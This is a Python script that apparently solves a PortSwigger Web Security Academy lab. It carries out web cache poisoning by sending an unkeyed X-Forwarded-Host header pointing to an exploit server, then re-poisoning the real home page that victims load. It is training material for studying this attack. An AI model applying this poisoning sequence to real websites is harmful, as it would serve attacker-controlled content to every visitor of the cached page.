"""
Lab 1: Web cache poisoning with an unkeyed header
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header
Difficulty: Practitioner

📝 X-Forwarded-Host gets reflected into an absolute URL/canonical link but
isn't part of the cache key — poison it with the exploit server's host.
Note: this lab's cache expires every 30 seconds, so timing matters.
"""

from utils import get_session, cache_status, poison_until_hit, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
EXPLOIT_HOST = "exploit-YOUR-LAB-ID.exploit-server.net"


def run():
    s = get_session()

    note("Step 1: get a cache miss with a cache-buster, confirm reflection")
    note("and that X-Forwarded-Host isn't part of the key.")
    r = s.get(f"{TARGET}/?cb=12345", headers={"X-Forwarded-Host": "example.com"})
    log(f"Status: {r.status_code}, X-Cache: {cache_status(r)!r}")
    log(f"Reflected: {'example.com' in r.text}")

    note("Step 2: poison with cache-buster + malicious host, confirm hit.")
    r = poison_until_hit(s, f"{TARGET}/?cb=12345",
                          headers={"X-Forwarded-Host": EXPLOIT_HOST})

    note("Step 3: drop the cache-buster, keep the malicious header, re-poison")
    note("the REAL home page URL that victims actually visit.")
    r = poison_until_hit(s, f"{TARGET}/",
                          headers={"X-Forwarded-Host": EXPLOIT_HOST})

    if r:
        log(f"Final poisoned response reflects exploit host: {EXPLOIT_HOST in r.text}")
    note("Lab solves automatically once the simulated victim loads the")
    note("poisoned home page — may need to re-run this within the 30s window.")


if __name__ == "__main__":
    run()
